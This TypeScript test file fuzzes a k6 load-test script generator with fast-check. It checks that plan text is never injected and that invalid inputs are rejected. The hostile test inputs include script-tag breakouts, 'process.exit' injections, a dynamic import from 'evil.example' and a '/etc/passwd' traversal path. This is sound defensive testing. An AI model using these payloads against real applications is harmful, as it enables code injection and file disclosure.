import { describe, expect, test } from 'bun:test';
import fc from 'fast-check';
import { parseHttpsOrigin } from '../src/config.ts';
import { buildStageScriptCfg, generateStageScript } from '../src/k6/script.ts';
import type { StageScriptInput } from '../src/k6/script.ts';
import { isRouteId, ORDER_PRODUCT_ID, orderBody, PRODUCT_IDS, ROUTE_CATALOG } from '../src/plan/catalog.ts';
import { evaluatePlan } from '../src/plan/policy.ts';
import type { TestPlan } from '../src/types.ts';

// ---------------------------------------------------------------------------
// Generators (inline; this file does not use test/arb.ts)
// ---------------------------------------------------------------------------

const WEB = 'https://yue.macro.my.id';
const API = 'https://api.yue.macro.my.id';
const ALLOWLIST = [WEB, API] as const;
const CFG_PREFIX = 'const CFG = ';

const ROUTE_IDS = ROUTE_CATALOG.map((r) => r.id);

const HOSTILE_PAYLOADS: readonly string[] = [
  '</script><script>alert(1)</script>',
  '</SCRIPT >',
  '`${process.exit(1)}`',
  "'; process.exit(1); //",
  '"; import("https://evil.example/x.js"); "',
  '*/ evil() /*',
  '\u2028evil()\u2029',
  '\nconst CFG = {};\n',
  '${CFG.runId}',
  '"+(()=>{throw 1})()+"',
  '<!--',
  ']]>',
  '\\u0022',
  '\u0000',
  'https://evil.example',
  '../../etc/passwd',
  'uma-1" ,"x',
  'a'.repeat(5000),
];

const arbHostile: fc.Arbitrary<string> = fc.oneof(
  fc.constantFrom(...HOSTILE_PAYLOADS),
  fc.string({ unit: 'binary', maxLength: 80 }),
  fc.string({ unit: 'grapheme', maxLength: 60 }),
  fc.tuple(fc.constantFrom(...HOSTILE_PAYLOADS), fc.string({ maxLength: 20 })).map(([a, b]) => `${b}${a}${b}`),
);

const arbAcceptedStages = fc
  .uniqueArray(fc.integer({ min: 1, max: 500 }), { minLength: 1, maxLength: 6 })
  .chain((vus) =>
    fc
      .array(fc.integer({ min: 30, max: 100 }), { minLength: vus.length, maxLength: vus.length })
      .map((durations) =>
        [...vus].sort((a, b) => a - b).map((v, i) => ({ vus: v, durationSec: durations[i] ?? 30 })),
      ),
  );

const arbAcceptedJourney = fc
  .array(
    fc.record({
      route: fc.constantFrom(...ROUTE_IDS),
      probability: fc.integer({ min: 1, max: 100 }),
      thinkMs: fc.oneof(fc.integer({ min: 0, max: 10_000 }), fc.constantFrom(0, 10_000)),
    }),
    { minLength: 1, maxLength: 8 },
  )
  .map((steps) => {
    let seenOrder = false;
    return steps.map((s) => {
      if (s.route !== 'order_create') return s;
      if (seenOrder) return { ...s, route: 'health' as const };
      seenOrder = true;
      return { ...s, probability: Math.min(s.probability, 25) };
    });
  });

const arbName: fc.Arbitrary<string> = arbHostile.map((s) => `MACRO_NAME_MARKER_${s}`);

const arbAcceptedPlan: fc.Arbitrary<TestPlan> = fc.record({
  name: arbName,
  target: fc.constantFrom(WEB, API),
  stages: arbAcceptedStages,
  journey: arbAcceptedJourney,
  stopThresholds: fc.record({
    p95Ms: fc.integer({ min: 100, max: 5000 }),
    errorRatePct: fc.double({ min: 0.1, max: 20, noNaN: true }),
  }),
});

/** The only mapping from a Test_Plan to script input: no name, rationale, or target string passes through. */
function scriptInput(plan: TestPlan, stageIndex: number, runId: string): StageScriptInput {
  const stage = plan.stages[stageIndex];
  if (stage === undefined) throw new Error('no such stage');
  return {
    runId,
    stageIndex,
    vus: stage.vus,
    durationSec: stage.durationSec,
    journey: plan.journey,
    origins: { web: WEB, api: API },
    productIds: PRODUCT_IDS,
    orderProductId: ORDER_PRODUCT_ID,
  };
}

const BASE_INPUT: StageScriptInput = {
  runId: '11111111-2222-3333-4444-555555555555',
  stageIndex: 0,
  vus: 25,
  durationSec: 60,
  journey: [{ route: 'store_home', probability: 100, thinkMs: 500 }],
  origins: { web: WEB, api: API },
  productIds: PRODUCT_IDS,
  orderProductId: ORDER_PRODUCT_ID,
};

/** Script text with the single `const CFG = ...;` line removed. */
function templateOnly(script: string): string {
  const lines = script.split('\n');
  const at = lines.findIndex((l) => l.startsWith(CFG_PREFIX));
  expect(at).toBeGreaterThanOrEqual(0);
  return [...lines.slice(0, at), ...lines.slice(at + 1)].join('\n');
}

function cfgLine(script: string): string {
  const lines = script.split('\n').filter((l) => l.startsWith(CFG_PREFIX));
  expect(lines.length).toBe(1);
  return lines[0] ?? '';
}

function parseCfg(script: string): unknown {
  const line = cfgLine(script);
  expect(line.endsWith(';')).toBe(true);
  return JSON.parse(line.slice(CFG_PREFIX.length, -1));
}

function stringLeaves(value: unknown, out: string[] = []): string[] {
  if (typeof value === 'string') out.push(value);
  else if (Array.isArray(value)) for (const v of value) stringLeaves(v, out);
  else if (value !== null && typeof value === 'object') {
    for (const [k, v] of Object.entries(value)) {
      out.push(k);
      stringLeaves(v, out);
    }
  }
  return out;
}

const TEMPLATE = templateOnly(generateStageScript(BASE_INPUT));

describe('Property 9: Stage scripts contain only approved values', () => {
  test('accepted plans produce scripts with the approved values and none of the plan name', () => {
    // Feature: macro, Property 9: Stage scripts contain only approved values
    fc.assert(
      fc.property(arbAcceptedPlan, fc.uuid(), (plan, runId) => {
        expect(evaluatePlan(plan, ALLOWLIST).status).toBe('accepted');
        plan.stages.forEach((stage, i) => {
          const script = generateStageScript(scriptInput(plan, i, runId));
          expect(script).toContain("executor: 'constant-vus'");
          expect(script).toContain(`"vus":${stage.vus},`);
          expect(script).toContain(`"durationSec":${stage.durationSec},`);
          expect(script).toContain("timeout: '10s'");
          expect(script).toContain('tags: { route: routeId }');
          for (const step of plan.journey) {
            expect(script).toContain(`"route":"${step.route}"`);
            expect(script).toContain(`"${step.route}":{"id":"${step.route}"`);
          }
          // Nothing from the plan's free text reaches the script.
          expect(script).not.toContain('MACRO_NAME_MARKER_');
          expect(script).not.toContain(plan.name);
          expect(script).not.toContain('</script');
          // The only varying text is the CFG line.
          expect(templateOnly(script)).toBe(TEMPLATE);
        });
      }),
      { numRuns: 200 },
    );
  });

  test('two plans that differ only in name produce byte-identical scripts', () => {
    // Feature: macro, Property 9: Stage scripts contain only approved values
    fc.assert(
      fc.property(arbAcceptedPlan, arbName, fc.uuid(), (plan, otherName, runId) => {
        const other: TestPlan = { ...plan, name: otherName };
        plan.stages.forEach((_, i) => {
          expect(generateStageScript(scriptInput(other, i, runId))).toBe(generateStageScript(scriptInput(plan, i, runId)));
        });
      }),
      { numRuns: 100 },
    );
  });

  test('there is exactly one `const CFG` injection point, it parses as JSON, and it holds only approved values', () => {
    // Feature: macro, Property 9: Stage scripts contain only approved values
    fc.assert(
      fc.property(arbAcceptedPlan, fc.uuid(), (plan, runId) => {
        plan.stages.forEach((_, i) => {
          const input = scriptInput(plan, i, runId);
          const script = generateStageScript(input);
          expect(script.split('const CFG').length - 1).toBe(1);
          const cfg = parseCfg(script);
          expect(cfg).toEqual(JSON.parse(JSON.stringify(buildStageScriptCfg(input))));
          expect(Object.keys(cfg as object).sort()).toEqual(
            ['durationSec', 'journey', 'orderBody', 'origins', 'productIds', 'routes', 'runId', 'stageIndex', 'vus'].sort(),
          );

          const approved = new Set<string>([
            runId,
            WEB,
            API,
            ...PRODUCT_IDS,
            ...ROUTE_CATALOG.flatMap((r) => [r.id, r.role, r.method, r.path, ...(r.body !== undefined ? [r.body] : [])]),
            ...Object.keys(orderBody(runId)),
            ...Object.values(orderBody(runId)).filter((v): v is string => typeof v === 'string'),
            'id', 'role', 'method', 'path', 'body', 'route', 'probability', 'thinkMs',
            'runId', 'stageIndex', 'vus', 'durationSec', 'origins', 'web', 'api', 'productIds', 'routes', 'journey', 'orderBody',
          ]);
          for (const leaf of stringLeaves(cfg)) expect(approved.has(leaf)).toBe(true);

          // Stop thresholds, target, name never appear as keys either.
          expect(JSON.stringify(cfg)).not.toContain('stopThresholds');
          expect(JSON.stringify(cfg)).not.toContain('p95Ms');
          expect(JSON.stringify(cfg)).not.toContain('errorRatePct');
          // order_create body is present exactly when the journey uses it.
          const usesOrder = plan.journey.some((s) => s.route === 'order_create');
          expect((cfg as { orderBody: unknown }).orderBody === null).toBe(!usesOrder);
        });
      }),
      { numRuns: 100 },
    );
  });

  test('CFG line contains no raw `<`, `>`, `&`, U+2028, or U+2029, and the script has no `</script`', () => {
    // Feature: macro, Property 9: Stage scripts contain only approved values
    fc.assert(
      fc.property(arbAcceptedPlan, fc.uuid(), (plan, runId) => {
        plan.stages.forEach((_, i) => {
          const script = generateStageScript(scriptInput(plan, i, runId));
          expect(/[<>&\u2028\u2029]/.test(cfgLine(script))).toBe(false);
          expect(script.toLowerCase()).not.toContain('</script');
          expect(script).not.toContain('\u2028');
          expect(script).not.toContain('\u2029');
        });
      }),
      { numRuns: 100 },
    );
  });

  test('hostile strings in the Run ID, origins, product IDs, and route IDs are rejected, never injected', () => {
    // Feature: macro, Property 9: Stage scripts contain only approved values
    const validRunId = (s: string): boolean => /^[A-Za-z0-9-]{8,64}$/.test(s);
    const validSlug = (s: string): boolean => /^[a-z0-9-]{1,40}$/.test(s);
    fc.assert(
      fc.property(arbHostile, (hostile) => {
        const reject = (input: StageScriptInput): void => {
          expect(() => generateStageScript(input)).toThrow('invalid stage script input');
          expect(() => buildStageScriptCfg(input)).toThrow();
        };
        if (!validRunId(hostile)) reject({ ...BASE_INPUT, runId: hostile });
        if (parseHttpsOrigin(hostile) !== hostile) {
          reject({ ...BASE_INPUT, origins: { web: hostile, api: API } });
          reject({ ...BASE_INPUT, origins: { web: WEB, api: hostile } });
        }
        if (!validSlug(hostile)) {
          reject({ ...BASE_INPUT, productIds: [hostile] });
          reject({ ...BASE_INPUT, productIds: [...PRODUCT_IDS, hostile] });
          reject({ ...BASE_INPUT, orderProductId: hostile });
        }
        if (!isRouteId(hostile)) {
          reject({ ...BASE_INPUT, journey: [{ route: hostile, probability: 50, thinkMs: 0 }] });
          reject({
            ...BASE_INPUT,
            journey: [{ route: 'health', probability: 50, thinkMs: 0 }, { route: hostile, probability: 50, thinkMs: 0 }],
          });
        }
      }),
      { numRuns: 300 },
    );
  });

  test('values that pass validation can only change the CFG line', () => {
    // Feature: macro, Property 9: Stage scripts contain only approved values
    const arbValidRunId = fc.stringMatching(/^[A-Za-z0-9-]{8,64}$/);
    const arbSlug = fc.stringMatching(/^[a-z0-9-]{1,40}$/);
    fc.assert(
      fc.property(
        arbValidRunId,
        fc.array(arbSlug, { minLength: 1, maxLength: 5 }),
        arbSlug,
        fc.integer({ min: 0, max: 1000 }),
        fc.integer({ min: 1, max: 500 }),
        fc.integer({ min: 1, max: 600 }),
        arbAcceptedJourney,
        (runId, productIds, orderProductId, stageIndex, vus, durationSec, journey) => {
          const script = generateStageScript({
            runId,
            stageIndex,
            vus,
            durationSec,
            journey,
            origins: { web: WEB, api: API },
            productIds,
            orderProductId,
          });
          expect(templateOnly(script)).toBe(TEMPLATE);
          const cfg = parseCfg(script) as { runId: string; productIds: string[]; orderBody: { productId: string; notes: string } | null };
          expect(cfg.runId).toBe(runId);
          expect(cfg.productIds).toEqual(productIds);
          if (cfg.orderBody !== null) {
            expect(cfg.orderBody.productId).toBe(orderProductId);
            expect(cfg.orderBody.notes).toContain(runId);
          }
        },
      ),
      { numRuns: 200 },
    );
  });

  test('unknown keys (such as a plan name or rationale) and out-of-range numbers are rejected', () => {
    // Feature: macro, Property 9: Stage scripts contain only approved values
    fc.assert(
      fc.property(arbHostile, fc.constantFrom('name', 'rationale', 'target', 'stopThresholds', 'cmd', '__proto__x'), (text, key) => {
        const withExtra = { ...BASE_INPUT, [key]: text } as StageScriptInput;
        expect(() => generateStageScript(withExtra)).toThrow('invalid stage script input');
      }),
      { numRuns: 100 },
    );
    const bad: Partial<StageScriptInput>[] = [
      { vus: 0 },
      { vus: 501 },
      { vus: 1.5 },
      { vus: Number.NaN },
      { vus: Number.POSITIVE_INFINITY },
      { durationSec: 0 },
      { durationSec: 601 },
      { durationSec: 30.5 },
      { stageIndex: -1 },
      { stageIndex: 1001 },
      { journey: [] },
      { journey: Array.from({ length: 9 }, () => ({ route: 'health', probability: 50, thinkMs: 0 })) },
      { journey: [{ route: 'health', probability: 0, thinkMs: 0 }] },
      { journey: [{ route: 'health', probability: 101, thinkMs: 0 }] },
      { journey: [{ route: 'health', probability: 50, thinkMs: -1 }] },
      { journey: [{ route: 'health', probability: 50, thinkMs: 10_001 }] },
      { journey: [{ route: 'health', probability: 50.5, thinkMs: 0 }] },
      { productIds: [] },
      { origins: { web: 'http://yue.macro.my.id', api: API } },
      { origins: { web: 'https://yue.macro.my.id/', api: API } },
      { origins: { web: 'https://YUE.macro.my.id', api: API } },
      { origins: { web: 'https://user@yue.macro.my.id', api: API } },
    ];
    for (const patch of bad) {
      expect(() => generateStageScript({ ...BASE_INPUT, ...patch })).toThrow('invalid stage script input');
    }
  });

  test('fixed template facts: executor, per-route thresholds, 10 s timeout, summary path, macro_429', () => {
    // Feature: macro, Property 9: Stage scripts contain only approved values
    const script = generateStageScript({
      ...BASE_INPUT,
      journey: [
        { route: 'store_home', probability: 100, thinkMs: 0 },
        { route: 'order_create', probability: 10, thinkMs: 0 },
      ],
    });
    expect(script).toContain("executor: 'constant-vus'");
    expect(script).toContain("timeout: '10s'");
    expect(script).toContain("'/out/summary.json'");
    expect(script).toContain("new Counter('macro_429')");
    expect(script).toContain("'http_req_duration{route:' + id + '}'");
    expect(script).toContain("['max>=0']");
    expect(script).toContain('tags: { route: routeId }');
    expect(script).toContain('Macro Load Test');
    expect(script).toContain('macro run 11111111-2222-3333-4444-555555555555');
    // No order body when the journey has no order_create.
    expect(parseCfg(generateStageScript(BASE_INPUT))).toMatchObject({ orderBody: null });
  });

  test('fixed template facts: the per-second sampler feeds macro_samples', () => {
    const script = generateStageScript({
      ...BASE_INPUT,
      journey: [
        { route: 'store_home', probability: 100, thinkMs: 0 },
        { route: 'order_create', probability: 10, thinkMs: 0 },
      ],
    });
    // Sampler bookkeeping: wall-clock second, per-second per-route buckets.
    expect(script).toContain('function sample(');
    expect(script).toContain("const second = Math.floor((Date.now() - startedAt) / 1000)");
    expect(script).toContain("buckets[key] || (buckets[key] = [second, routeId, 0, 0, 0, 0])");
    // The summary the script writes carries macro_samples alongside the k6 data.
    expect(script).toContain('const samples = { intervalSec: 1, buckets: Object.values(buckets) };');
    expect(script).toContain('JSON.stringify(Object.assign({}, data, { macro_samples: samples }))');
  });
});

test('own-site routes are embedded and the shop catalog is not', () => {
  const script = generateStageScript({
    runId: 'run-0001-abcd',
    stageIndex: 0,
    vus: 10,
    durationSec: 60,
    journey: [{ route: 'r4', probability: 10, thinkMs: 800 }],
    origins: { web: 'https://sketch.my.id', api: 'https://sketch.my.id' },
    productIds: ['uma-1'],
    orderProductId: 'uma-1',
    routes: [{ id: 'r4', role: 'web', method: 'GET', path: '/assets/a.webp' }],
  });
  expect(script).toContain('/assets/a.webp');
  expect(script).toContain('https://sketch.my.id');
  expect(script).not.toContain('yue.macro.my.id');
  expect(script).not.toContain('{productId}');
  expect(script).not.toContain('order_create');
});
